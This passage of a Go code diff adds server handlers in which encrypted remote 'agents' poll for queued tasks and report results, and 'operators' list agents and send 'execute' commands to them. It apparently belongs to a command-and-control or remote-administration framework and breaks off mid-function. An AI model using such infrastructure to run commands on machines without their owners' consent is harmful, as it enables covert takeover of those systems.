@@ -153,3 +153,98 @@ func (s *Server) handleAgent(w http.ResponseWriter, r *http.Request) {
 		}
 
 		decrypted, err := s.crypto.Decrypt(string(msg))
+		if err != nil {
+			continue
+		}
+
+		var response map[string]interface{}
+		if err := json.Unmarshal(decrypted, &response); err != nil {
+			continue
+		}
+
+		agent.mu.Lock()
+		agent.LastSeen = time.Now()
+
+		if taskID, ok := response["task_id"].(string); ok {
+			for i, task := range agent.TaskQueue {
+				if task.ID == taskID {
+					agent.TaskQueue[i].Status = "completed"
+					agent.TaskQueue[i].Completed = time.Now()
+					if result, ok := response["result"].(string); ok {
+						agent.TaskQueue[i].Result = result
+					}
+
+					agent.TaskHistory = append(agent.TaskHistory, agent.TaskQueue[i])
+
+					s.logMu.Lock()
+					s.taskLog = append(s.taskLog, agent.TaskQueue[i])
+					s.logMu.Unlock()
+
+					s.broadcastToOperators(Message{
+						Type:    "task_result",
+						AgentID: agent.ID,
+						Data:    agent.TaskQueue[i],
+					})
+					break
+				}
+			}
+		}
+
+		if len(agent.TaskQueue) > 0 {
+			for i, task := range agent.TaskQueue {
+				if task.Status == "pending" {
+					taskData, _ := json.Marshal(task)
+					encrypted, _ := s.crypto.Encrypt(taskData)
+					conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
+					agent.TaskQueue[i].Status = "sent"
+					break
+				}
+			}
+		}
+		agent.mu.Unlock()
+	}
+}
+
+func (s *Server) handleOperator(w http.ResponseWriter, r *http.Request) {
+	conn, err := s.upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		log.Printf("operator upgrade failed: %v", err)
+		return
+	}
+
+	s.opMu.Lock()
+	s.operators[conn] = true
+	s.opMu.Unlock()
+
+	defer func() {
+		s.opMu.Lock()
+		delete(s.operators, conn)
+		s.opMu.Unlock()
+		conn.Close()
+	}()
+
+	s.sendAgentList(conn)
+
+	for {
+		_, msg, err := conn.ReadMessage()
+		if err != nil {
+			break
+		}
+
+		var cmd Message
+		if err := json.Unmarshal(msg, &cmd); err != nil {
+			continue
+		}
+
+		switch cmd.Type {
+		case "list_agents":
+			s.sendAgentList(conn)
+
+		case "execute":
+			if data, ok := cmd.Data.(map[string]interface{}); ok {
+				agentID := data["agent_id"].(string)
+				command := data["command"].(string)
+				args := ""
+				if a, ok := data["args"].(string); ok {
+					args = a
+				}
